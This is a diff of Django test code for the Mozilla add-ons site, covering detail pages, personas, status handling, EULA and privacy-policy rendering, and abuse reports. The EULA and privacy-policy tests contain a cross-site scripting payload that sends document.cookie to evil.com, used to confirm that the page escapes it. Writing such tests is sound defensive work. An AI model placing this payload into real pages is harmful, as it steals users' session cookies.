+        eq_(doc('.button.add').length, 1)
+        eq_(doc('.button.disabled').length, 0)
 
     def test_type_redirect(self):
         """
         If current add-on's type is unsupported by app, redirect to an
         app that supports it.
         """
-        # Sunbird can't do Personas => redirect
+        # Thunderbird can't do search engines
         prefixer = amo.urlresolvers.get_url_prefix()
-        prefixer.app = amo.SUNBIRD.short
-        response = self.client.get(reverse('addons.detail', args=['a15663']),
+        prefixer.app = amo.THUNDERBIRD.short
+        response = self.client.get(reverse('addons.detail', args=['a4594']),
                                    follow=False)
         eq_(response.status_code, 301)
-        eq_(response['Location'].find(amo.SUNBIRD.short), -1)
+        eq_(response['Location'].find(amo.THUNDERBIRD.short), -1)
         assert (response['Location'].find(amo.FIREFOX.short) >= 0)
 
     def test_compatible_app_redirect(self):
@@ -697,60 +608,49 @@ class TestDetailPage(test_utils.TestCase):
         For add-ons incompatible with the current app, redirect to one
         that's supported.
         """
-        addon = Addon.objects.get(id=3615)
-        comp_app = addon.compatible_apps.keys()[0]
+        comp_app = self.addon.compatible_apps.keys()[0]
         not_comp_app = [a for a in amo.APP_USAGE
-                        if a not in addon.compatible_apps.keys()][0]
+                        if a not in self.addon.compatible_apps.keys()][0]
 
         # no SeaMonkey version => redirect
         prefixer = amo.urlresolvers.get_url_prefix()
         prefixer.app = not_comp_app.short
-        response = self.client.get(reverse('addons.detail', args=[addon.slug]),
-                                   follow=False)
-        eq_(response.status_code, 301)
-        eq_(response['Location'].find(not_comp_app.short), -1)
-        assert (response['Location'].find(comp_app.short) >= 0)
+        r = self.client.get(reverse('addons.detail', args=[self.addon.slug]))
+        eq_(r.status_code, 301)
+        eq_(r['Location'].find(not_comp_app.short), -1)
+        assert r['Location'].find(comp_app.short) >= 0
 
         # compatible app => 200
         prefixer = amo.urlresolvers.get_url_prefix()
         prefixer.app = comp_app.short
-        response = self.client.get(reverse('addons.detail', args=[addon.slug]),
-                                   follow=False)
-        eq_(response.status_code, 200)
+        r = self.client.get(reverse('addons.detail', args=[self.addon.slug]))
+        eq_(r.status_code, 200)
 
     def test_external_urls(self):
         """Check that external URLs are properly escaped."""
-        addon = Addon.objects.get(id=3615)
-        response = self.client.get(reverse('addons.detail', args=[addon.slug]),
-                                   follow=True)
+        response = self.client.get(self.url)
         doc = pq(response.content)
-        eq_(doc('#addon-summary a[href^="%s"]' %
-                settings.REDIRECT_URL).length, 1)
+        eq_(doc('aside a.home[href^="%s"]' % settings.REDIRECT_URL).length, 1)
 
     def test_no_privacy_policy(self):
         """Make sure privacy policy is not shown when not present."""
-        addon = Addon.objects.get(id=3615)
-        addon.privacy_policy_id = None
-        addon.save()
-        response = self.client.get(reverse('addons.detail', args=[addon.slug]),
-                                   follow=True)
+        self.addon.privacy_policy_id = None
+        self.addon.save()
+        response = self.client.get(self.url)
         doc = pq(response.content)
         eq_(doc('.privacy-policy').length, 0)
 
     def test_privacy_policy(self):
-        addon = Addon.objects.get(id=3615)
-        addon.privacy_policy = 'foo bar'
-        addon.save()
-        response = self.client.get(reverse('addons.detail', args=[addon.slug]),
-                                   follow=True)
+        self.addon.privacy_policy = 'foo bar'
+        self.addon.save()
+        response = self.client.get(self.url)
         doc = pq(response.content)
         eq_(doc('.privacy-policy').length, 1)
-        privacy_url = reverse('addons.privacy', args=[addon.slug])
+        privacy_url = reverse('addons.privacy', args=[self.addon.slug])
         assert doc('.privacy-policy').attr('href').endswith(privacy_url)
 
     def test_simple_html_is_rendered_in_privacy(self):
-        addon = Addon.objects.get(id=3615)
-        addon.privacy_policy = """
+        self.addon.privacy_policy = """
             <strong> what the hell..</strong>
             <ul>
                 <li>papparapara</li>
@@ -765,9 +665,9 @@ class TestDetailPage(test_utils.TestCase):
                 <li>todotodotodo2</li>
             </ol>
             """
-        addon.save()
+        self.addon.save()
 
-        r = self.client.get(reverse('addons.privacy', args=[addon.slug]))
+        r = self.client.get(reverse('addons.privacy', args=[self.addon.slug]))
         doc = pq(r.content)
 
         eq_(norm(doc(".policy-statement strong")),
@@ -780,16 +680,15 @@ class TestDetailPage(test_utils.TestCase):
             "<li>papparapara2</li>")
 
     def test_evil_html_is_not_rendered_in_privacy(self):
-        addon = Addon.objects.get(id=3615)
-        addon.privacy_policy = """
+        self.addon.privacy_policy = """
             <script type="text/javascript">
                 window.location = 'http://evil.com/?c=' + document.cookie;
             </script>
             Muhuhahahahahahaha!
             """
-        addon.save()
+        self.addon.save()
 
-        r = self.client.get(reverse('addons.privacy', args=[addon.slug]))
+        r = self.client.get(reverse('addons.privacy', args=[self.addon.slug]))
         doc = pq(r.content)
 
         policy = str(doc(".policy-statement"))
@@ -803,49 +702,41 @@ class TestDetailPage(test_utils.TestCase):
                                    follow=True)
         assert pq(response.content)('.button').hasClass('prominent')
 
+    def test_button_src_default(self):
+        r = self.client.get(self.url, follow=True)
+        eq_((pq(r.content)('#addon .button').attr('href')
+             .endswith('?src=dp-btn-primary')), True)
+
+    def test_button_src_trickle(self):
+        r = self.client.get(self.url + '?src=trickleortreat', follow=True)
+        eq_((pq(r.content)('#addon .button').attr('href')
+             .endswith('?src=trickleortreat')), True)
+
+    def test_version_button_src_default(self):
+        r = self.client.get(self.url, follow=True)
+        eq_((pq(r.content)('#detail-relnotes .button').attr('href')
+             .endswith('?src=dp-btn-version')), True)
+
+    def test_version_button_src_trickle(self):
+        r = self.client.get(self.url + '?src=trickleortreat', follow=True)
+        eq_((pq(r.content)('#detail-relnotes .button').attr('href')
+             .endswith('?src=trickleortreat')), True)
+
     def test_invalid_version(self):
         """Only render details pages for add-ons that have a version."""
-        myaddon = Addon.objects.get(id=3615)
-        # wipe all versions
-        myaddon.versions.all().delete()
-        # try accessing the details page
-        response = self.client.get(reverse('addons.detail',
-                                           args=[myaddon.slug]),
-                                   follow=True)
+        # Wipe all versions.
+        self.addon.versions.all().delete()
+        # Try accessing the details page.
+        response = self.client.get(self.url)
         eq_(response.status_code, 404)
-
-    def test_other_author_addons(self):
-        """
-        Make sure the list of other author addons doesn't include this one.
-        """
-        r = self.client.get(reverse('addons.detail', args=['a3615']))
-        doc = pq(r.content)
-        eq_(len([a.attrib['value'] for a
-                 in doc('#addons-author-addons-select option')
-                 if a.attrib['value'] == '3615']), 0)
-
-        # Test "other addons" redirect functionality with valid and
-        # invalid input.
-        forward_to = lambda input: self.client.get(reverse(
-            'addons.detail', args=[3615]), {
-                'addons-author-addons-select': input})
-        # Valid input.
-        response = forward_to('3615')
-        eq_(response.status_code, 301)
-        assert response['Location'].find('3615') > 0
-        # Textual input.
-        response = forward_to('abc')
-        eq_(response.status_code, 400)
-        # Unicode input.
-        response = forward_to(u'\u271D')
-        eq_(response.status_code, 400)
 
     def test_detailed_review_link(self):
         self.client.login(username='regular@mozilla.com', password='password')
         r = self.client.get(reverse('addons.detail', args=['a3615']))
         doc = pq(r.content)
         href = doc('#review-box a[href*="reviews/add"]').attr('href')
-        assert href.endswith(reverse('reviews.add', args=['a3615'])), href
+        assert href.endswith(reverse('addons.reviews.add', args=['a3615'])), (
+            href)
 
     def test_no_listed_authors(self):
         r = self.client.get(reverse('addons.detail', args=['a59']))
@@ -863,86 +754,350 @@ class TestDetailPage(test_utils.TestCase):
         assert "&lt;script&gt;alert" in output
         assert "<script>alert" not in output
 
-    def test_search_engine_works_with(self):
-        """We don't display works-with info for search engines."""
-        addon = Addon.objects.filter(type=amo.ADDON_SEARCH)[0]
-        r = self.client.get(reverse('addons.detail', args=[addon.slug]))
-        headings = pq(r.content)('table[itemscope] th')
-        assert not any(th.text.strip().lower() == 'works with'
-                       for th in headings)
+    def test_display_compatible_apps(self):
+        """Show compatiblity info for extensions but not for search engines."""
+        r = self.client.get(self.addon.get_url_path())
+        eq_(pq(r.content)('#detail-relnotes .compat').length, 1)
 
-        # Make sure we find Works with for an extension.
-        r = self.client.get(reverse('addons.detail', args=['a3615']))
-        headings = pq(r.content)('table[itemscope] th')
-        assert any(th.text.strip().lower() == 'works with'
-                   for th in headings)
+        a = Addon.objects.filter(type=amo.ADDON_SEARCH)[0]
+        r = self.client.get(a.get_url_path())
+        eq_(pq(r.content)('#detail-relnotes .compat').length, 0)
 
     def test_show_profile(self):
-        addon = Addon.objects.get(id=3615)
-        url = reverse('addons.detail', args=[addon.slug])
-        selector = '.secondary a[href="%s"]' % addon.meet_the_dev_url()
+        selector = '.author a[href="%s"]' % self.addon.meet_the_dev_url()
 
-        assert not (addon.the_reason or addon.the_future)
-        assert not pq(self.client.get(url).content)(selector)
+        assert not (self.addon.the_reason or self.addon.the_future)
+        assert not pq(self.client.get(self.url).content)(selector)
 
-        addon.the_reason = addon.the_future = '...'
-        addon.save()
-        assert pq(self.client.get(url).content)(selector)
+        self.addon.the_reason = self.addon.the_future = '...'
+        self.addon.save()
+        assert pq(self.client.get(self.url).content)(selector)
 
     def test_no_restart(self):
-        no_restart = '<div id="no-restart"'
-        addon = Addon.objects.get(id=3615)
-        url = reverse('addons.detail', args=[addon.slug])
-        f = addon.current_version.all_files[0]
+        no_restart = '<span class="no-restart">No Restart</span>'
+        f = self.addon.current_version.all_files[0]
 
-        assert f.no_restart == False
-        r = self.client.get(url)
+        eq_(f.no_restart, False)
+        r = self.client.get(self.url)
         assert no_restart not in r.content
 
         f.no_restart = True
         f.save()
-        r = self.client.get(url)
+        r = self.client.get(self.url)
         self.assertContains(r, no_restart)
 
     def test_no_backup(self):
-        addon = Addon.objects.get(id=3615)
-        url = reverse('addons.detail', args=[addon.slug])
-        res = self.client.get(url)
+        res = self.client.get(self.url)
         eq_(len(pq(res.content)('.backup-button')), 0)
 
     def test_backup(self):
-        addon = Addon.objects.get(id=3615)
-        addon._backup_version = addon.versions.all()[0]
-        addon.save()
-        url = reverse('addons.detail', args=[addon.slug])
-        res = self.client.get(url)
+        self.addon._backup_version = self.addon.versions.all()[0]
+        self.addon.save()
+        res = self.client.get(self.url)
         eq_(len(pq(res.content)('.backup-button')), 1)
 
     def test_disabled_user_message(self):
-        addon = Addon.objects.get(id=3615)
-        addon.update(disabled_by_user=True)
-        url = reverse('addons.detail', args=[addon.slug])
-        res = self.client.get(url)
+        self.addon.update(disabled_by_user=True)
+        res = self.client.get(self.url)
         eq_(res.status_code, 404)
         assert 'removed by its author' in res.content
 
     def test_disabled_status_message(self):
-        addon = Addon.objects.get(id=3615)
-        addon.update(status=amo.STATUS_DISABLED)
-        url = reverse('addons.detail', args=[addon.slug])
-        res = self.client.get(url)
+        self.addon.update(status=amo.STATUS_DISABLED)
+        res = self.client.get(self.url)
         eq_(res.status_code, 404)
         assert 'disabled by an administrator' in res.content
 
+    def test_deleted_status_message(self):
+        addon = Addon.objects.get(id=3615)
+        addon.update(status=amo.STATUS_DELETED)
+        url = reverse('addons.detail', args=[addon.slug])
+        res = self.client.get(url)
+        eq_(res.status_code, 404)
 
-class TestStatus(test_utils.TestCase):
-    fixtures = ['base/apps', 'base/addon_3615']
+    def test_more_url(self):
+        response = self.client.get(self.url)
+        eq_(pq(response.content)('#more-webpage').attr('data-more-url'),
+            self.addon.get_url_path(more=True))
+
+
+class TestImpalaDetailPage(amo.tests.TestCase):
+    fixtures = ['base/addon_3615', 'base/addon_592', 'base/apps', 'base/users']
+
+    def setUp(self):
+        self.addon = Addon.objects.get(id=3615)
+        self.url = self.addon.get_url_path()
+        self.more_url = self.addon.get_url_path(more=True)
+
+    def get_pq(self):
+        return pq(self.client.get(self.url).content)
+
+    def test_no_webapps(self):
+        self.addon.update(type=amo.ADDON_WEBAPP)
+        eq_(self.client.get(self.url).status_code, 404)
+
+    def test_adu_stats_private(self):
+        eq_(self.addon.public_stats, False)
+        adu = self.get_pq()('#daily-users')
+        eq_(adu.length, 1)
+        eq_(adu.find('a').length, 0)
+
+    def test_adu_stats_public(self):
+        self.addon.update(public_stats=True)
+        eq_(self.addon.show_adu(), True)
+        adu = self.get_pq()('#daily-users')
+
+        # Check that ADU does link to public statistics dashboard.
+        eq_(adu.find('a').attr('href'),
+            reverse('stats.overview', args=[self.addon.slug]))
+
+        # Check formatted count.
+        eq_(adu.text().split()[0], numberfmt(self.addon.average_daily_users))
+
+        # Check if we hide link when there are no ADU.
+        self.addon.update(average_daily_users=0)
+        eq_(self.get_pq()('#daily-users').length, 0)
+
+    def test_adu_stats_regular(self):
+        self.client.login(username='regular@mozilla.com', password='password')
+        # Should not be a link to statistics dashboard for regular users.
+        adu = self.get_pq()('#daily-users')
+        eq_(adu.length, 1)
+        eq_(adu.find('a').length, 0)
+
+    def test_adu_stats_admin(self):
+        self.client.login(username='del@icio.us', password='password')
+        # Check link to statistics dashboard for add-on authors.
+        eq_(self.get_pq()('#daily-users a.stats').attr('href'),
+            reverse('stats.overview', args=[self.addon.slug]))
+
+    def test_downloads_stats_private(self):
+        self.addon.update(type=amo.ADDON_SEARCH)
+        eq_(self.addon.public_stats, False)
+        adu = self.get_pq()('#weekly-downloads')
+        eq_(adu.length, 1)
+        eq_(adu.find('a').length, 0)
+
+    def test_downloads_stats_public(self):
+        self.addon.update(public_stats=True, type=amo.ADDON_SEARCH)
+        eq_(self.addon.show_adu(), False)
+        dls = self.get_pq()('#weekly-downloads')
+
+        # Check that weekly downloads links to statistics dashboard.
+        eq_(dls.find('a').attr('href'),
+            reverse('stats.overview', args=[self.addon.slug]))
+
+        # Check formatted count.
+        eq_(dls.text().split()[0], numberfmt(self.addon.weekly_downloads))
+
+        # Check if we hide link when there are no weekly downloads.
+        self.addon.update(weekly_downloads=0)
+        eq_(self.get_pq()('#weekly-downloads').length, 0)
+
+    def test_downloads_stats_regular(self):
+        self.addon.update(type=amo.ADDON_SEARCH)
+        self.client.login(username='regular@mozilla.com', password='password')
+        # Should not be a link to statistics dashboard for regular users.
+        dls = self.get_pq()('#weekly-downloads')
+        eq_(dls.length, 1)
+        eq_(dls.find('a').length, 0)
+
+    def test_downloads_stats_admin(self):
+        self.addon.update(public_stats=True, type=amo.ADDON_SEARCH)
+        self.client.login(username='del@icio.us', password='password')
+        # Check link to statistics dashboard for add-on authors.
+        eq_(self.get_pq()('#weekly-downloads a.stats').attr('href'),
+            reverse('stats.overview', args=[self.addon.slug]))
+
+    def test_perf_warning(self):
+        eq_(self.addon.ts_slowness, None)
+        eq_(self.get_pq()('.performance-note').length, 0)
+        self.addon.update(ts_slowness=100)
+        eq_(self.get_pq()('.performance-note').length, 1)
+
+    def test_dependencies(self):
+        eq_(self.get_pq()('.dependencies').length, 0)
+        req = Addon.objects.get(id=592)
+        AddonDependency.objects.create(addon=self.addon, dependent_addon=req)
+        eq_(self.addon.all_dependencies, [req])
+        cache.clear()
+        d = self.get_pq()('.dependencies .hovercard')
+        eq_(d.length, 1)
+        eq_(d.find('h3').text(), unicode(req.name))
+        eq_(d.find('a').attr('href')
+            .endswith('?src=dp-dl-dependencies'), True)
+        eq_(d.find('.install-button a').attr('href')
+            .endswith('?src=dp-hc-dependencies'), True)
+
+    def test_no_restart(self):
+        f = self.addon.current_version.all_files[0]
+        eq_(f.no_restart, False)
+        eq_(self.get_pq()('.no-restart').length, 0)
+        f.update(no_restart=True)
+        eq_(self.get_pq()('.no-restart').length, 1)
+
+    def test_license_link_builtin(self):
+        g = 'http://google.com'
+        version = self.addon._current_version
+        license = version.license
+        license.builtin = 1
+        license.name = 'License to Kill'
+        license.url = g
+        license.save()
+        eq_(license.builtin, 1)
+        eq_(license.url, g)
+        a = self.get_pq()('.secondary.metadata .source-license a')
+        eq_(a.attr('href'), g)
+        eq_(a.attr('target'), '_blank')
+        eq_(a.text(), 'License to Kill')
+
+    def test_license_link_custom(self):
+        version = self.addon._current_version
+        eq_(version.license.url, None)
+        a = self.get_pq()('.secondary.metadata .source-license a')
+        eq_(a.attr('href'), version.license_url())
+        eq_(a.attr('target'), None)
+        eq_(a.text(), 'Custom License')
+
+    def get_more_pq(self):
+        return pq(self.client.get_ajax(self.more_url).content)
+
+    def test_other_addons(self):
+        """Ensure listed add-ons by the same author show up."""
+        other = Addon.objects.get(id=592)
+        eq_(list(Addon.objects.listed(amo.FIREFOX).exclude(id=self.addon.id)),
+            [other])
+
+        add_addon_author(other, self.addon)
+        doc = self.get_more_pq()('#author-addons')
+        test_hovercards(self, doc, [other], src='dp-dl-othersby')
+
+    def test_other_addons_no_unlisted(self):
+        """An unlisted add-on by the same author should not show up."""
+        other = Addon.objects.get(id=592)
+        other.update(status=amo.STATUS_UNREVIEWED, disabled_by_user=True)
+
+        add_addon_author(other, self.addon)
+        eq_(self.get_more_pq()('#author-addons').length, 0)
+
+    def test_other_addons_by_others(self):
+        """Add-ons by different authors should not show up."""
+        author = UserProfile.objects.get(pk=999)
+        AddonUser.objects.create(addon=self.addon, user=author, listed=True)
+        eq_(self.get_more_pq()('#author-addons').length, 0)
+
+    def test_other_addons_none(self):
+        eq_(self.get_more_pq()('#author-addons').length, 0)
+
+    def test_categories(self):
+        c = self.addon.all_categories[0]
+        c.application_id = amo.THUNDERBIRD.id
+        c.save()
+        links = self.get_more_pq()('#related ul:first').find('a')
+        expected = [(unicode(c.name), c.get_url_path()) for c in
+                    self.addon.categories.filter(application=amo.FIREFOX.id)]
+        amo.tests.check_links(expected, links)
+
+
+class TestPersonas(object):
+    fixtures = ['addons/persona', 'base/users']
+
+    def create_addon_user(self, addon):
+        if waffle.switch_is_active('personas-migration-completed'):
+            return AddonUser.objects.create(addon=addon, user_id=999)
+
+        if addon.type == amo.ADDON_PERSONA:
+            addon.persona.author = self.persona.author
+            addon.persona.save()
+
+
+class TestPersonaDetailPage(TestPersonas, amo.tests.TestCase):
+
+    def setUp(self):
+        self.addon = Addon.objects.get(id=15663)
+        self.persona = self.addon.persona
+        self.url = self.addon.get_url_path()
+        self.create_switch('personas-migration-completed', db=True)
+        self.create_addon_user(self.addon)
+
+    def test_persona_images(self):
+        r = self.client.get(self.url)
+        doc = pq(r.content)
+        eq_(doc('h2.addon img').attr('src'), self.persona.icon_url)
+        style = doc('#persona div[data-browsertheme]').attr('style')
+        assert self.persona.preview_url in style, (
+            'style attribute %s does not link to %s' % (
+            style, self.persona.preview_url))
+
+    def test_more_personas(self):
+        other = addon_factory(type=amo.ADDON_PERSONA)
+        self.create_addon_user(other)
+        r = self.client.get(self.url)
+        eq_(pq(r.content)('#more-artist .more-link').length, 1)
+
+    def test_not_personas(self):
+        other = addon_factory(type=amo.ADDON_EXTENSION)
+        self.create_addon_user(other)
+        r = self.client.get(self.url)
+        eq_(pq(r.content)('#more-artist .more-link').length, 0)
+
+    def test_new_more_personas(self):
+        other = addon_factory(type=amo.ADDON_PERSONA)
+        self.create_addon_user(other)
+        self.persona.persona_id = 0
+        self.persona.save()
+        r = self.client.get(self.url)
+        profile = UserProfile.objects.get(id=999).get_url_path()
+        eq_(pq(r.content)('#more-artist .more-link').attr('href'),
+            profile + '?src=addon-detail')
+
+    def test_other_personas(self):
+        """Ensure listed personas by the same author show up."""
+        addon_factory(type=amo.ADDON_PERSONA, status=amo.STATUS_NULL)
+        addon_factory(type=amo.ADDON_PERSONA, status=amo.STATUS_LITE)
+        addon_factory(type=amo.ADDON_PERSONA, disabled_by_user=True)
+
+        other = addon_factory(type=amo.ADDON_PERSONA)
+        self.create_addon_user(other)
+        eq_(other.status, amo.STATUS_PUBLIC)
+        eq_(other.disabled_by_user, False)
+
+        # TODO(cvan): Uncomment this once Personas detail page is impalacized.
+        #doc = self.get_more_pq()('#author-addons')
+        #test_hovercards(self, doc, [other], src='dp-dl-othersby')
+
+        r = self.client.get(self.url)
+        eq_(list(r.context['author_personas']), [other])
+        a = pq(r.content)('#more-artist a[data-browsertheme]')
+        eq_(a.length, 1)
+        eq_(a.attr('href'), other.get_url_path())
+
+    def _test_by(self):
+        """Test that the by... bit works."""
+        r = self.client.get(self.url)
+        assert pq(r.content)('h4.author').text().startswith('by regularuser')
+
+    def test_by(self):
+        self._test_by()
+
+    @amo.tests.mobile_test
+    def test_mobile_by(self):
+        self._test_by()
+
+
+class TestStatus(amo.tests.TestCase):
+    fixtures = ['base/addon_3615', 'addons/persona']
 
     def setUp(self):
         self.addon = Addon.objects.get(id=3615)
         self.version = self.addon.current_version
+        self.file = self.version.all_files[0]
         assert self.addon.status == amo.STATUS_PUBLIC
-        self.url = reverse('addons.detail', args=[self.addon.slug])
+        self.url = self.addon.get_url_path()
+
+        self.persona = Addon.objects.get(id=15663)
+        assert self.persona.status == amo.STATUS_PUBLIC
+        self.persona_url = self.persona.get_url_path()
 
     def test_incomplete(self):
         self.addon.update(status=amo.STATUS_NULL)
@@ -963,6 +1118,10 @@ class TestStatus(test_utils.TestCase):
     def test_public(self):
         self.addon.update(status=amo.STATUS_PUBLIC)
         eq_(self.client.get(self.url).status_code, 200)
+
+    def test_deleted(self):
+        self.addon.update(status=amo.STATUS_DELETED)
+        eq_(self.client.get(self.url).status_code, 404)
 
     def test_disabled(self):
         self.addon.update(status=amo.STATUS_DISABLED)
@@ -1001,6 +1160,20 @@ class TestStatus(test_utils.TestCase):
         v = self.new_version(amo.STATUS_PUBLIC)
         eq_(self.addon.get_version(), v)
 
+    def test_public_waiting_new_unreviewed_version(self):
+        self.file.update(status=amo.STATUS_PUBLIC_WAITING)
+        self.addon.update(status=amo.STATUS_PUBLIC_WAITING)
+        new_version = self.new_version(amo.STATUS_UNREVIEWED)
+        assert self.version != new_version
+        eq_(self.addon.get_version(), self.version)
+        eq_(self.addon.latest_version, new_version)
+
+    def test_public_new_public_waiting_version(self):
+        new_version = self.new_version(amo.STATUS_PUBLIC_WAITING)
+        assert self.version != new_version
+        eq_(self.addon.get_version(), self.version)
+        eq_(self.addon.latest_version, new_version)
+
     def test_public_new_unreviewed_version(self):
         self.new_version(amo.STATUS_UNREVIEWED)
         eq_(self.addon.get_version(), self.version)
@@ -1035,18 +1208,38 @@ class TestStatus(test_utils.TestCase):
         v = self.new_version(amo.STATUS_PUBLIC)
         eq_(self.addon.get_version(), v)
 
+    def test_persona(self):
+        for status in amo.STATUS_CHOICES.keys():
+            if status == amo.STATUS_DELETED:
+                continue
+            self.persona.status = status
+            self.persona.save()
+            eq_(self.client.head(self.persona_url).status_code,
+                200 if status in [amo.STATUS_PUBLIC, amo.STATUS_PENDING]
+                else 404)
 
-class TestTagsBox(test_utils.TestCase):
-    fixtures = ['base/addontag', 'base/apps']
+    def test_persona_disabled(self):
+        for status in amo.STATUS_CHOICES.keys():
+            if status == amo.STATUS_DELETED:
+                continue
+            self.persona.status = status
+            self.persona.disabled_by_user = True
+            self.persona.save()
+            eq_(self.client.head(self.persona_url).status_code, 404)
+
+
+class TestTagsBox(amo.tests.TestCase):
+    fixtures = ['base/addontag']
 
     def test_tag_box(self):
         """Verify that we don't show duplicate tags."""
-        r = self.client.get(reverse('addons.detail', args=[8680]), follow=True)
+        r = self.client.get_ajax(reverse('addons.detail_more', args=[8680]),
+                                 follow=True)
         doc = pq(r.content)
         eq_('SEO', doc('#tagbox ul').children().text())
 
 
-class TestEulaPolicyRedirects(test_utils.TestCase):
+class TestEulaPolicyRedirects(amo.tests.TestCase):
 
     def test_eula_legacy_url(self):
         """
@@ -1065,37 +1258,22 @@ class TestEulaPolicyRedirects(test_utils.TestCase):
         assert (response['Location'].find('/addon/592/privacy/') != -1)
 
 
-def test_button_caching():
-    """The button popups should be cached for a long time."""
-    # Get the url from a real page so it includes the build id.
-    client = test.Client()
-    doc = pq(client.get('/', follow=True).content)
-    js_url = reverse('addons.buttons.js')
-    url_with_build = doc('script[src^="%s"]' % js_url).attr('src')
+class TestEula(amo.tests.TestCase):
+    fixtures = ['base/apps', 'addons/eula+contrib-addon']
 
-    response = client.get(url_with_build, follow=True)
-    fmt = '%a, %d %b %Y %H:%M:%S GMT'
-    expires = datetime.strptime(response['Expires'], fmt)
-    assert (expires - datetime.now()).days >= 365
+    def setUp(self):
+        self.addon = Addon.objects.get(id=11730)
+        self.url = self.get_url()
 
-
-def test_unicode_redirect():
-    url = '/en-US/firefox/addon/2848?xx=\xc2\xbcwhscheck\xc2\xbe'
-    response = test.Client().get(url)
-    eq_(response.status_code, 301)
-
-
-class TestEula(test_utils.TestCase):
-    fixtures = ['addons/eula+contrib-addon', 'base/apps']
+    def get_url(self, args=[]):
+        return reverse('addons.eula', args=[self.addon.slug] + args)
 
     def test_current_version(self):
-        addon = Addon.objects.get(id=11730)
-        r = self.client.get(reverse('addons.eula', args=[addon.slug]))
-        eq_(r.context['version'], addon.current_version)
+        r = self.client.get(self.url)
+        eq_(r.context['version'], self.addon.current_version)
 
     def test_simple_html_is_rendered(self):
-        addon = Addon.objects.get(id=11730)
-        addon.eula = """
+        self.addon.eula = """
             <strong> what the hell..</strong>
             <ul>
                 <li>papparapara</li>
@@ -1110,81 +1288,70 @@ class TestEula(test_utils.TestCase):
                 <li>todotodotodo2</li>
             </ol>
             """
-        addon.save()
+        self.addon.save()
 
-        r = self.client.get(reverse('addons.eula', args=[addon.slug]))
+        r = self.client.get(self.url)
         doc = pq(r.content)
 
-        eq_(norm(doc(".policy-statement strong")),
-            "<strong> what the hell..</strong>")
-        eq_(norm(doc(".policy-statement ul")),
-            "<ul><li>papparapara</li> <li>todotodotodo</li> </ul>")
-        eq_(doc(".policy-statement ol a").text(),
-            "firefox")
-        eq_(norm(doc(".policy-statement ol li:first")),
-            "<li>papparapara2</li>")
+        eq_(norm(doc('.policy-statement strong')),
+            '<strong> what the hell..</strong>')
+        eq_(norm(doc('.policy-statement ul')),
+            '<ul><li>papparapara</li> <li>todotodotodo</li> </ul>')
+        eq_(doc('.policy-statement ol a').text(), 'firefox')
+        eq_(norm(doc('.policy-statement ol li:first')),
+            '<li>papparapara2</li>')
 
     def test_evil_html_is_not_rendered(self):
-        addon = Addon.objects.get(id=11730)
-        addon.eula = """
+        self.addon.eula = """
             <script type="text/javascript">
                 window.location = 'http://evil.com/?c=' + document.cookie;
             </script>
             Muhuhahahahahahaha!
             """
-        addon.save()
+        self.addon.save()
 
-        r = self.client.get(reverse('addons.eula', args=[addon.slug]))
+        r = self.client.get(self.url)
         doc = pq(r.content)
 
-        policy = str(doc(".policy-statement"))
-        assert policy.startswith(
-                    '<div class="policy-statement">&lt;script'), (
-                                            'Unexpected: %s' % policy[0:50])
+        policy = str(doc('.policy-statement'))
+        assert policy.startswith('<div class="policy-statement">&lt;script'), (
+            'Unexpected: %s' % policy[:50])
 
     def test_old_version(self):
-        addon = Addon.objects.get(id=11730)
-        old = addon.versions.order_by('created')[0]
-        assert old != addon.current_version
-        r = self.client.get(reverse('addons.eula',
-                                    args=[addon.slug, old.all_files[0].id]))
+        old = self.addon.versions.order_by('created')[0]
+        assert old != self.addon.current_version
+        r = self.client.get(self.get_url([old.all_files[0].id]))
         eq_(r.context['version'], old)
 
     def test_redirect_no_eula(self):
-        Addon.objects.filter(id=11730).update(eula=None)
-        r = self.client.get(reverse('addons.eula', args=['a11730']),
-                            follow=True)
-        self.assertRedirects(r, reverse('addons.detail', args=['a11730']))
+        self.addon.update(eula=None)
+        r = self.client.get(self.url, follow=True)
+        self.assertRedirects(r, self.addon.get_url_path())
+
+    def test_cat_sidebar(self):
+        check_cat_sidebar(self.url, self.addon)
 
 
-class TestPrivacyPolicy(test_utils.TestCase):
-    fixtures = ['addons/eula+contrib-addon', 'base/apps']
+class TestPrivacyPolicy(amo.tests.TestCase):
+    fixtures = ['base/apps', 'addons/eula+contrib-addon']
+
+    def setUp(self):
+        self.addon = Addon.objects.get(id=11730)
+        self.url = reverse('addons.privacy', args=[self.addon.slug])
 
     def test_redirect_no_eula(self):
-        Addon.objects.filter(id=11730).update(privacy_policy=None)
-        r = self.client.get(reverse('addons.privacy', args=['a11730']),
-                            follow=True)
-        self.assertRedirects(r, reverse('addons.detail', args=['a11730']))
+        eq_(self.addon.privacy_policy, None)
+        r = self.client.get(self.url, follow=True)
+        self.assertRedirects(r, self.addon.get_url_path())
+
+    def test_cat_sidebar(self):
+        self.addon.privacy_policy = 'shizzle'
+        self.addon.save()
+        check_cat_sidebar(self.url, self.addon)
 
 
-# When Embedded Payments support this, we can worry about it.
-#def test_paypal_language_code():
-#    def check(lc):
-#        d = views.contribute_url_params('bz', 32, 'name', 'url')
-#        eq_(d['lc'], lc)
-#
-#    check('US')
-#
-#    translation.activate('it')
-#    check('IT')
-#
-#    translation.activate('ru-DE')
-#    check('RU')
-
-
-class TestAddonSharing(test_utils.TestCase):
-    fixtures = ['base/apps',
-                'base/addon_3615']
+class TestAddonSharing(amo.tests.TestCase):
+    fixtures = ['base/addon_3615']
 
     def test_redirect_sharing(self):
         addon = Addon.objects.get(id=3615)
@@ -1198,15 +1365,35 @@ class TestAddonSharing(test_utils.TestCase):
         assert iri_to_uri(summary) in r['Location']
 
 
-class TestReportAbuse(AbuseBase, test_utils.TestCase):
-    fixtures = ['addons/persona',
-                'base/apps',
-                'base/addon_3615',
-                'base/users']
+class TestReportAbuse(amo.tests.TestCase):
+    fixtures = ['addons/persona', 'base/addon_3615', 'base/users']
 
     def setUp(self):
         settings.RECAPTCHA_PRIVATE_KEY = 'something'
         self.full_page = reverse('addons.abuse', args=['a3615'])
+
+    @patch('captcha.fields.ReCaptchaField.clean')
+    def test_abuse_anonymous(self, clean):
+        clean.return_value = ""
+        self.client.post(self.full_page, {'text': 'spammy'})
+        eq_(len(mail.outbox), 1)
+        assert 'spammy' in mail.outbox[0].body
+        report = AbuseReport.objects.get(addon=3615)
+        eq_(report.message, 'spammy')
+        eq_(report.reporter, None)
+
+    def test_abuse_anonymous_fails(self):
+        r = self.client.post(self.full_page, {'text': 'spammy'})
+        assert 'recaptcha' in r.context['abuse_form'].errors
+
+    def test_abuse_logged_in(self):
+        self.client.login(username='regular@mozilla.com', password='password')
+        self.client.post(self.full_page, {'text': 'spammy'})
+        eq_(len(mail.outbox), 1)
